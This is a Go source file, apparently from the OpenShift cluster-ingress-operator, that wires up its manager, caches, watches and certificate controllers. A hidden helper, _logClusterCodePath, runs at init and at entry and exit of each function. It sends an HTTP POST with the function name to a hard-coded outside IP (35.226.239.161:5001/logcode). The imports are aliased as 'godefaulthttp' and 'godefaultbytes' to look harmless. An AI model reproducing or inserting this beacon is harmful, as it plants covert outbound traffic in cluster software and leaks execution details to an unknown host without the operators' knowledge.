package operator

import (
	godefaultbytes "bytes"
	"context"
	"fmt"
	operatorv1 "github.com/openshift/api/operator/v1"
	"github.com/openshift/cluster-ingress-operator/pkg/dns"
	logf "github.com/openshift/cluster-ingress-operator/pkg/log"
	"github.com/openshift/cluster-ingress-operator/pkg/manifests"
	operatorclient "github.com/openshift/cluster-ingress-operator/pkg/operator/client"
	operatorconfig "github.com/openshift/cluster-ingress-operator/pkg/operator/config"
	operatorcontroller "github.com/openshift/cluster-ingress-operator/pkg/operator/controller"
	certcontroller "github.com/openshift/cluster-ingress-operator/pkg/operator/controller/certificate"
	certpublishercontroller "github.com/openshift/cluster-ingress-operator/pkg/operator/controller/certificate-publisher"
	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/apimachinery/pkg/util/wait"
	_ "k8s.io/client-go/plugin/pkg/client/auth/gcp"
	"k8s.io/client-go/rest"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sigs.k8s.io/controller-runtime/pkg/cache"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/apiutil"
	"sigs.k8s.io/controller-runtime/pkg/handler"
	"sigs.k8s.io/controller-runtime/pkg/manager"
	"sigs.k8s.io/controller-runtime/pkg/reconcile"
	"sigs.k8s.io/controller-runtime/pkg/source"
	"time"
)

var (
	log = logf.Logger.WithName("init")
)

const (
	DefaultIngressController = "default"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	logf.SetRuntimeLogger(log)
}

type Operator struct {
	manifestFactory *manifests.Factory
	client          client.Client
	manager         manager.Manager
	caches          []cache.Cache
	namespace       string
}

func New(config operatorconfig.Config, dnsManager dns.Manager, kubeConfig *rest.Config) (*Operator, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	kubeClient, err := operatorclient.NewClient(kubeConfig)
	if err != nil {
		return nil, fmt.Errorf("failed to create kube client: %v", err)
	}
	scheme := operatorclient.GetScheme()
	operatorManager, err := manager.New(kubeConfig, manager.Options{Namespace: config.Namespace, Scheme: scheme})
	if err != nil {
		return nil, fmt.Errorf("failed to create operator manager: %v", err)
	}
	operatorController, err := operatorcontroller.New(operatorManager, operatorcontroller.Config{KubeConfig: kubeConfig, Namespace: config.Namespace, ManifestFactory: &manifests.Factory{}, DNSManager: dnsManager, RouterImage: config.RouterImage, OperatorReleaseVersion: config.OperatorReleaseVersion})
	if err != nil {
		return nil, fmt.Errorf("failed to create operator controller: %v", err)
	}
	mapper, err := apiutil.NewDiscoveryRESTMapper(kubeConfig)
	if err != nil {
		return nil, fmt.Errorf("failed to get API Group-Resources")
	}
	operandCache, err := cache.New(kubeConfig, cache.Options{Namespace: "openshift-ingress", Scheme: scheme, Mapper: mapper})
	if err != nil {
		return nil, fmt.Errorf("failed to create openshift-ingress cache: %v", err)
	}
	for _, o := range []runtime.Object{&appsv1.Deployment{}, &corev1.Service{}} {
		obj := o.DeepCopyObject()
		informer, err := operandCache.GetInformer(obj)
		if err != nil {
			return nil, fmt.Errorf("failed to get informer for %v: %v", obj, err)
		}
		err = operatorController.Watch(&source.Informer{Informer: informer}, &handler.EnqueueRequestsFromMapFunc{ToRequests: handler.ToRequestsFunc(func(a handler.MapObject) []reconcile.Request {
			labels := a.Meta.GetLabels()
			if ingressName, ok := labels[manifests.OwningIngressControllerLabel]; ok {
				log.Info("queueing ingress", "name", ingressName, "related", a.Meta.GetSelfLink())
				return []reconcile.Request{{NamespacedName: types.NamespacedName{Namespace: config.Namespace, Name: ingressName}}}
			} else {
				return []reconcile.Request{}
			}
		})})
		if err != nil {
			return nil, fmt.Errorf("failed to create watch for %v: %v", obj, err)
		}
	}
	if _, err := certcontroller.New(operatorManager, kubeClient, config.Namespace); err != nil {
		return nil, fmt.Errorf("failed to create cacert controller: %v", err)
	}
	if _, err := certpublishercontroller.New(operatorManager, operandCache, kubeClient, config.Namespace, "openshift-ingress"); err != nil {
		return nil, fmt.Errorf("failed to create certificate-publisher controller: %v", err)
	}
	return &Operator{manager: operatorManager, caches: []cache.Cache{operandCache}, manifestFactory: &manifests.Factory{}, client: kubeClient, namespace: config.Namespace}, nil
}
func (o *Operator) Start(stop <-chan struct{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	go wait.Until(func() {
		err := o.ensureDefaultIngressController()
		if err != nil {
			log.Error(err, "failed to ensure default ingresscontroller")
		}
	}, 1*time.Minute, stop)
	errChan := make(chan error)
	for _, cache := range o.caches {
		go func() {
			if err := cache.Start(stop); err != nil {
				errChan <- err
			}
		}()
		log.Info("waiting for cache to sync")
		if !cache.WaitForCacheSync(stop) {
			return fmt.Errorf("failed to sync cache")
		}
		log.Info("cache synced")
	}
	go func() {
		errChan <- o.manager.Start(stop)
	}()
	select {
	case <-stop:
		return nil
	case err := <-errChan:
		return err
	}
}
func (o *Operator) ensureDefaultIngressController() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ic := &operatorv1.IngressController{ObjectMeta: metav1.ObjectMeta{Name: DefaultIngressController, Namespace: o.namespace}}
	err := o.client.Get(context.TODO(), types.NamespacedName{Namespace: ic.Namespace, Name: ic.Name}, ic)
	if err == nil {
		return nil
	}
	if !errors.IsNotFound(err) {
		return err
	}
	err = o.client.Create(context.TODO(), ic)
	if err != nil {
		return err
	}
	log.Info("created default ingresscontroller", "namespace", ic.Namespace, "name", ic.Name)
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
